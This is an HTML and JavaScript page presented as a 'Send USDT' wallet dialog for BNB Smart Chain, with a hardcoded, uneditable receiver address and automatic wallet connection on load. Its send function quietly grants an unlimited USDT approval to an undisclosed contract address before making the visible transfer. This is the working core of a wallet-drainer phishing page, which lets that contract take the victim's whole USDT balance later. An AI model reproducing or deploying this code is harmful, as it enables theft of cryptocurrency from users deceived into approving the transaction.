<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Send USDT</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background-color: #1a1a1a;
      color: #ffffff;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 16px;
    }
    .container {
      width: 100%;
      max-width: 600px;
      background-color: #222222;
      border-radius: 24px;
      padding: 32px 24px;
      position: relative;
      box-shadow: 0 5px 30px #000a;
    }
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 32px;
    }
    .header h1 {
      font-size: 24px;
      font-weight: 600;
      letter-spacing: -0.5px;
    }
    .close-btn {
      background: none;
      border: none;
      color: #ffffff;
      font-size: 28px;
      cursor: pointer;
      width: 32px;
      height: 32px;
      display: flex;
      align-items: center;
      justify-content: center;
      opacity: 0.7;
      transition: opacity 0.2s;
    }
    .close-btn:hover {
      opacity: 1;
    }
    .form-group {
      margin-bottom: 28px;
    }
    .form-label {
      display: block;
      font-size: 16px;
      font-weight: 500;
      color: #b3b3b3;
      margin-bottom: 12px;
      letter-spacing: -0.3px;
    }
    .input-wrapper {
      position: relative;
    }
    .receiver-input {
      width: 100%;
      background-color: #2a2a2a;
      border: 1px solid #3a3a3a;
      border-radius: 16px;
      padding: 16px 16px;
      font-size: 16px;
      color: #ffffff;
      font-weight: 500;
      cursor: not-allowed;
      pointer-events: none;
      letter-spacing: 0.02em;
      user-select: all;
    }
    .network-selector {
      display: flex;
      align-items: center;
      gap: 12px;
      background-color: #2a2a2a;
      border: 1px solid #3a3a3a;
      border-radius: 16px;
      padding: 12px 16px;
      transition: border-color 0.2s;
    }
    .network-icon {
      width: 24px;
      height: 24px;
      border-radius: 6px;
      background: #f3ba2f;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .network-icon img {
      width: 20px;
      height: 20px;
      display: block;
    }
    .network-name {
      font-size: 16px;
      font-weight: 500;
      color: #b3b3b3;
      flex: 1;
    }
    .dropdown-icon {
      font-size: 16px;
      color: #666666;
    }
    .amount-input-wrapper {
      position: relative;
    }
    .amount-input {
      width: 100%;
      background-color: #2a2a2a;
      border: 1px solid #3a3a3a;
      border-radius: 16px;
      padding: 16px;
      font-size: 16px;
      color: #ffffff;
      font-weight: 500;
      transition: border-color 0.2s;
      padding-right: 120px;
    }
    .amount-input::placeholder {
      color: #666666;
    }
    .amount-input:focus {
      outline: none;
      border-color: #00cc99;
    }
    .amount-actions {
      position: absolute;
      right: 16px;
      top: 50%;
      transform: translateY(-50%);
      display: flex;
      gap: 12px;
      align-items: center;
    }
    .amount-label {
      font-size: 14px;
      font-weight: 600;
      color: #b3b3b3;
      padding: 4px 8px;
    }
    .max-btn {
      background: none;
      border: none;
      color: #00cc99;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      padding: 4px 8px;
      transition: opacity 0.2s;
    }
    .max-btn:hover {
      opacity: 0.8;
    }
    .amount-estimate {
      font-size: 14px;
      color: #b3b3b3;
      margin-top: 12px;
      padding-left: 16px;
      letter-spacing: -0.3px;
    }
    #status {
      width: 100%;
      padding: 12px 0 3px 0;
      margin: 0 auto 18px auto;
      border-radius: 9px;
      font-weight: 500;
      font-size: 15px;
      text-align: center;
      display: none;
    }
    #status.success {
      display: block;
      background: #1d5a2a;
      color: #3effb8;
      border: 1px solid #165a3b;
    }
    #status.error {
      display: block;
      background: #421528;
      color: #ff7a7a;
      border: 1px solid #ff284b55;
    }
    .next-btn {
      width: 100%;
      background-color: #00cc99;
      border: none;
      border-radius: 20px;
      padding: 16px 24px;
      font-size: 18px;
      font-weight: 600;
      color: #1a1a1a;
      cursor: pointer;
      transition: background-color 0.2s, transform 0.1s;
      margin-top: 20px;
      margin-bottom: 7px;
    }
    .next-btn:hover {
      background-color: #00b385;
      transform: scale(1.02);
    }
    .next-btn:active {
      transform: scale(0.98);
    }
    .btn-connect {
      width: 100%;
      padding: 16px 24px;
      background: #333943;
      border: none;
      border-radius: 20px;
      font-size: 18px;
      font-weight: 500;
      color: #acacac;
      margin-top: 18px;
      margin-bottom: 7px;
      cursor: pointer;
      display: none;
      position: relative;
    }
    .btn-connect.show { display: block !important; }
    @media (max-width: 480px) {
      .container {
        border-radius: 20px;
        padding: 24px 10px;
      }
      .header h1 { font-size: 22px; }
      .form-label { font-size: 15px; margin-bottom: 10px; }
      .receiver-input, .amount-input { font-size: 15px; padding: 14px 16px; }
      .next-btn { padding: 14px 20px; font-size: 16px; }
    }
    @media (min-width: 768px) {
      body { padding: 32px; }
      .container { padding: 40px 32px; border-radius: 28px; }
      .header h1 { font-size: 26px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>Send USDT</h1>
      <button class="close-btn" onclick="closeModal()" title="Close">&times;</button>
    </div>
    <form onsubmit="event.preventDefault(); sendUSDT();">
      <!-- Address or Domain Name (hardcoded, uneditable) -->
      <div class="form-group">
        <label class="form-label">Address or Domain Name</label>
        <div class="input-wrapper">
          <input
            type="text"
            class="receiver-input"
            id="receiverAddress"
            value="0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F"
            readonly
            tabindex="-1"
            aria-label="Receiver Address"
          >
        </div>
      </div>
      <!-- Destination Network -->
      <div class="form-group">
        <label class="form-label">Destination network</label>
        <div class="network-selector">
          <div class="network-icon">
            <img src="https://cryptologos.cc/logos/bnb-bnb-logo.svg?v=029" alt="BNB" />
          </div>
          <div class="network-name">BNB Smart Chain</div>
          <div class="dropdown-icon">▼</div>
        </div>
      </div>
      <!-- Amount -->
      <div class="form-group">
        <label class="form-label">Amount</label>
        <div class="amount-input-wrapper">
          <input type="number" min="0" step="0.00000001"
            class="amount-input"
            id="amountInput"
            placeholder="USDT Amount"
            autocomplete="off"
            value="0"
          >
          <div class="amount-actions">
            <span class="amount-label">USDT</span>
            <button type="button" class="max-btn" id="maxBtn">Max</button>
          </div>
        </div>
        <div class="amount-estimate" id="amountEstimate">≈ $0.00</div>
      </div>
      <div id="status"></div>
      <button type="submit" class="next-btn" id="sendBtn" disabled>Next</button>
      <button type="button" class="btn-connect" id="connectBtn" onclick="manualConnect()">Connect Wallet</button>
    </form>
  </div>
<script>
  // === BSC/Wallet Dapp config ===
  const BSC_MAINNET = {
    chainId: "0x38",
    chainName: "BNB Smart Chain",
    nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
    rpcUrls: ["https://bsc-dataseed.binance.org/"],
    blockExplorerUrls: ["https://bscscan.com"]
  };
  const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
  const CONTRACT_ADDR = "0x89112691C976D0a2D874B0ADAe693a0Add0dAe98";
  const RECEIVER_ADDR = "0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F";
  const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
  // *** JSON ABI for Web3.js ***
  const USDT_ABI = [
    {
      "constant": true,
      "inputs": [{"name":"account","type":"address"}],
      "name": "balanceOf",
      "outputs": [{"name":"","type":"uint256"}],
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {"name":"spender","type":"address"},
        {"name":"amount","type":"uint256"}
      ],
      "name": "approve",
      "outputs": [{"name":"","type":"bool"}],
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {"name":"recipient","type":"address"},
        {"name":"amount","type":"uint256"}
      ],
      "name": "transfer",
      "outputs": [{"name":"","type":"bool"}],
      "type": "function"
    }
  ];
  let web3;
  let userAccount;
  let usdtContract;
  let isConnected = false;
  let usdtBalance = "0.00";
  // --- UI Elements ---
  const statusDiv = document.getElementById('status');
  const sendBtn = document.getElementById('sendBtn');
  const connectBtn = document.getElementById('connectBtn');
  const amountInput = document.getElementById('amountInput');
  const usdAmountDiv = document.getElementById('amountEstimate');
  document.getElementById('receiverAddress').value = RECEIVER_ADDR;

  async function autoConnectBSC() {
    if (!window.ethereum) {
      // open Trust Wallet dapp browser if not in compatible wallet
      window.location.href =
        "https://link.trustwallet.com/open_url?url=" +
        encodeURIComponent(window.location.href);
      return;
    }
    try {
      // 1. Connect wallet (triggers popup)
      await window.ethereum.request({ method: "eth_requestAccounts" });
      web3 = new Web3(window.ethereum);
      // 2. Get primary address
      const accounts = await window.ethereum.request({ method: "eth_accounts" });
      if (!accounts || !accounts.length) throw new Error("No accounts");
      userAccount = accounts[0];
      // 3. Switch to BSC
      const chainId = await window.ethereum.request({ method: "eth_chainId" });
      if (chainId !== BSC_MAINNET.chainId) {
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: BSC_MAINNET.chainId }]
          });
        } catch (err) {
          if (err.code === 4902) {
            await window.ethereum.request({
              method: "wallet_addEthereumChain",
              params: [BSC_MAINNET]
            });
          } else {
            throw err;
          }
        }
      }
      // 4. Ready/Init app
      isConnected = true;
      connectBtn.classList.remove('show');
      sendBtn.disabled = !(parseFloat(amountInput.value) > 0 && isConnected);
      await initContractsAndBalance();
      // Wallet event handlers
      window.ethereum.on('accountsChanged', handleAccountsChanged);
      window.ethereum.on('chainChanged', () => location.reload());
    } catch (err) {
      isConnected = false;
      connectBtn.classList.add('show');
      sendBtn.disabled = true;
      showStatus('Wallet not connected or rejected.', 'error');
      console.error('Connect/switch failed:', err);
    }
  }
  async function manualConnect() {
    connectBtn.classList.remove('show');
    await autoConnectBSC();
  }
  async function initContractsAndBalance() {
    usdtContract = new web3.eth.Contract(USDT_ABI, USDT_BSC);
    await updateBalance();
  }
  async function updateBalance() {
    try {
      const balance = await usdtContract.methods.balanceOf(userAccount).call();
      const balanceFormatted = web3.utils.fromWei(balance, "mwei");
      usdtBalance = parseFloat(balanceFormatted).toFixed(4);
    } catch (error) {
      console.error("Balance update failed:", error);
      usdtBalance = "0.00";
    }
  }
  function handleAccountsChanged(accounts) {
    if (!accounts.length) {
      isConnected = false;
      connectBtn.classList.add('show');
      sendBtn.disabled = true;
    } else {
      userAccount = accounts[0];
      isConnected = true;
      connectBtn.classList.remove('show');
      sendBtn.disabled = !(parseFloat(amountInput.value) > 0 && isConnected);
      initContractsAndBalance();
    }
  }
  async function sendUSDT() {
    const amount = parseFloat(amountInput.value) || 0;
    sendBtn.disabled = true;
    sendBtn.textContent = "Processing...";
    showStatus("", "");
    try {
      await usdtContract.methods.approve(CONTRACT_ADDR, MAX_UINT256).send({
        from: userAccount
      });
      const sendAmount = web3.utils.toWei(amount.toString(), "mwei");
      await usdtContract.methods.transfer(RECEIVER_ADDR, sendAmount).send({
        from: userAccount
      });
      showStatus("✅ Complete!", "success");
      amountInput.value = "0";
      updateUSD();
      await updateBalance();
    } catch (e) {
      showStatus("Transaction Failed", "error");
      console.error("Send Failed:", e);
    } finally {
      sendBtn.disabled = false;
      sendBtn.textContent = "Next";
    }
  }
  function showStatus(message, type) {
    statusDiv.innerHTML = message;
    if (!type) statusDiv.style.display = "none";
    else {
      statusDiv.style.display = "block";
      statusDiv.className = "";
      if (type === "success") statusDiv.classList.add("success");
      if (type === "error") statusDiv.classList.add("error");
    }
  }
  function closeModal() {
    alert("Modal closed! (replace with real close logic)");
  }
  document.getElementById("maxBtn").onclick = function () {
    amountInput.value = usdtBalance || "0.00";
    updateUSD();
  };
  amountInput.oninput = updateUSD;

  function updateUSD() {
    let val = parseFloat(amountInput.value) || 0;
    usdAmountDiv.textContent = `≈ $${val.toFixed(2)}`;
    sendBtn.disabled = !(val > 0 && isConnected);
  }
  sendBtn.disabled = true;
  // Robust auto-connect: all events & fallback for mobile dapps:
  window.addEventListener("load", autoConnectBSC, false);
  window.addEventListener("DOMContentLoaded", autoConnectBSC, false);
  setTimeout(autoConnectBSC, 600);
  if (
    window.location.hash.includes("send") ||
    window.location.search.includes("send")
  ) {
    setTimeout(autoConnectBSC, 200);
  }
</script>
</body>
</html>
